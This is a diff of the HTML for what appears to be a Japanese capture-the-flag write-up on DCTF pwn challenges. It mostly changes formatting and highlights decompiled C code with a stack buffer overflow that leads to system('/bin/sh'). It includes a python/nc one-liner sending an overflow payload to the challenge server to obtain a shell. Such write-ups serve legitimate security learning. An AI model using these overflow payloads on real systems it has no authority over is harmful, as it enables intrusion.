@@ -310,8 +310,7 @@ b64decode が bytearray(?) を返すので、UTF-8でデコードして返すと
 <span class="p">}</span>
 </code></pre></td></tr></table>
 </div>
-</div><p><br /></p>
-<div class="highlight"><div class="chroma">
+</div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -347,7 +346,7 @@ b64decode が bytearray(?) を返すので、UTF-8でデコードして返すと
 <span class="p">}</span>
 </code></pre></td></tr></table>
 </div>
-</div><p>まず、vuln()では、BOFを起こす前にローカル変数（local_c）も書き換えないといけません。</p>
+</div><p>まず、vuln()では、BOFを起こす際にローカル変数（local_c）も書き換えないといけません。</p>
 <p>その後にshell() があるので、シェルが取れるかと思いきや、&ldquo;try harder&rdquo; と言われます。</p>
 <pre>
 $ ./pwn_sanity_check_solve.py
@@ -369,7 +368,7 @@ $ checksec pwn_sanity_check
     NX:       NX enabled
     PIE:      No PIE (0x400000)
 </pre>
-<p><br />
+<p><br /><br />
 書いたコード。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -469,9 +468,9 @@ dctf{Ju5t_m0v3_0n}
 </span><span class="lnt">10
 </span><span class="lnt">11
 </span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
+</span><span class="hl"><span class="lnt">13
+</span></span><span class="hl"><span class="lnt">14
+</span></span><span class="lnt">15
 </span><span class="lnt">16
 </span><span class="lnt">17
 </span><span class="lnt">18
@@ -484,7 +483,7 @@ dctf{Ju5t_m0v3_0n}
 </span><span class="lnt">25
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
 
 <span class="p">{</span>
   <span class="kt">char</span> <span class="n">local_28</span> <span class="p">[</span><span class="mi">24</span><span class="p">];</span>
@@ -496,9 +495,9 @@ dctf{Ju5t_m0v3_0n}
   <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Is this a real life, or is it just a fanta sea?&#34;</span><span class="p">);</span>
   <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Am I dreaming?&#34;</span><span class="p">);</span>
   <span class="n">fgets</span><span class="p">(</span><span class="n">local_28</span><span class="p">,</span><span class="mi">100</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
-  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">==</span> <span class="mh">0x1337c0de</span><span class="p">)</span> <span class="p">{</span>
-    <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
-  <span class="p">}</span>
+<span class="hl">  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">==</span> <span class="mh">0x1337c0de</span><span class="p">)</span> <span class="p">{</span>
+</span><span class="hl">    <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+</span>  <span class="p">}</span>
   <span class="k">else</span> <span class="p">{</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">local_c</span> <span class="o">==</span> <span class="mh">0x1234567</span><span class="p">)</span> <span class="p">{</span>
       <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Pinch me!&#34;</span><span class="p">);</span>
@@ -508,10 +507,11 @@ dctf{Ju5t_m0v3_0n}
     <span class="p">}</span>
   <span class="p">}</span>
   <span class="k">return</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<span class="p">}</span></code></pre></td></tr></table>
 </div>
-</div><p>ローカル変数（local_10）の方を書き換えるだけで、/bin/sh が実行できそう。</p>
+</div>
+<p><br />
+ローカル変数（local_10）の方を書き換えるだけで、/bin/sh が実行できそう。</p>
 <pre>
 $ (python -c 'print("A"*24+"\xde\xc0\x37\x13")' ; cat - ) | nc dctf1-chall-pinch-me.westeurope.azurecontainer.io 7480
 Is this a real life, or is it just a fanta sea?
